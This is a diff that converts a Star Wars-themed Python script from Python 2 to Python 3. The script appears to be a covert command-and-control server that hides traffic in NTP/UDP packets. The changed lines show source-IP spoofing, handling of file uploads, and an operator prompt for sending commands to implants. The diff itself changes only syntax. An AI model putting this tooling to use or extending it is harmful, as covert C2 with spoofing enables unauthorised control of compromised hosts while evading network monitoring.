@@ -9,7 +9,7 @@ import argparse
 import readline
 import subprocess
 import time
-import commands
+import subprocess
 #histfile = os.path.join(os.path.expanduser("~"), ".ntphist")
 #print histfile
 
@@ -78,35 +78,35 @@ if log:
 	log = '%s-' % t + log
 f = open(log, 'w')
 f = open(log, 'a')
-u = commands.getstatusoutput('whoami')[1]
+u = subprocess.getstatusoutput('whoami')[1]
 
 #Print Banner
 subprocess.call(["clear"])
 subprocess.call(["cat", "./ls-banner.txt"])
 
-print ''
-q = raw_input('What Color Crystal are you wanting to use (RED, BLUE, PURPLE, etc..) ? ')
-print str(q).lower()
+print('')
+q = input('What Color Crystal are you wanting to use (RED, BLUE, PURPLE, etc..) ? ')
+print(str(q).lower())
 if str(q).lower() == 'red':
-	q = raw_input('What Order are we Executing??? ')
+	q = input('What Order are we Executing??? ')
 	if str(q).lower() == '66':
 		subprocess.call(['cat', './sl-banner.txt'])
-		print ''
-		print 'Welcome Sith Lord!'
-		print ''
+		print('')
+		print('Welcome Sith Lord!')
+		print('')
 	else:
-		print ''
-		print 'I find your lack of faith is disturbing.....'
-		print ''
+		print('')
+		print('I find your lack of faith is disturbing.....')
+		print('')
 		subprocess.call(['cat','./vs-banner.txt'])
-		print ''
-		print ''
-		print '...... Vader Breathing...... Choking Sounds....... Your Death......'
-		print ''
+		print('')
+		print('')
+		print('...... Vader Breathing...... Choking Sounds....... Your Death......')
+		print('')
 		quit()
 else:
-	print 'These are not the droids you are looking for.....'
-	print 'Jedi Scum....'
+	print('These are not the droids you are looking for.....')
+	print('Jedi Scum....')
 	quit()
 
 
@@ -140,7 +140,7 @@ def c2(packet):
 		src_ip= spoof
 	else:
 		src_ip= net + str(random.randrange(0,255, 1))
-	filtered_string = ''.join(filter(lambda x:x in string.printable, str(packet[0])))
+	filtered_string = ''.join([x for x in str(packet[0]) if x in string.printable])
 	global message
 	filtered_string = str(filtered_string).split(cdelim)
 	if len(filtered_string) > 1:
@@ -149,7 +149,7 @@ def c2(packet):
 		if EOL in i:
 			if packet[UDP].sport != 123:
 				destp = packet[UDP].sport
-			print ''
+			print('')
 			messageout = []
 			for i in message[:-1]:
 				try:
@@ -164,7 +164,7 @@ def c2(packet):
 						except:
 							c = c
 						if c == 'upfile':
-							print ''
+							print('')
 						else:
 							f.write(c)
 					f.close()
@@ -174,12 +174,12 @@ def c2(packet):
 				else:
 					messageout.append(i)
 			messageout = ''.join(map(str, messageout))
-			print messageout
+			print(messageout)
 			f.write(str(messageout)+'\n')
 			f.write('\n')
 			message = []
-			print ''
-			payload = raw_input('Command Example(Order 66): ')
+			print('')
+			payload = input('Command Example(Order 66): ')
 			if payload == 'reset':
 				break
 			if payload == 'exit':
